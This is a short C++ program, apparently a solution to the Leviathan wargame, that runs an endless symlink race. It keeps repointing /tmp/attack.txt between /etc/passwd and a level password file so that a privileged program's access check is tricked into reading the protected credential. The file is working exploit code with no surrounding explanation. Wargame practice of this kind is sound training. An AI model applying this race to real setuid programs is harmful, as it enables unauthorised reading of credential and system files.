#include <string>
#include <unistd.h>
#include <time.h>

const long long int sleepTime = 1000000L;

int main(){
    struct timespec t,t_rem;

    t.tv_sec = 0; t.tv_nsec = sleepTime;

    const char * linkPath = "/tmp/attack.txt";
    const char * readFile = "/etc/passwd";
    const char * attackFile = "/etc/leviathan_pass/leviathan3";

    while(1){
        unlink(linkPath);
        symlink(readFile,linkPath);
        nanosleep(&t,&t_rem);
        unlink(linkPath);
        symlink(attackFile,linkPath);
        nanosleep(&t,&t_rem);
    }
    return 0;
}

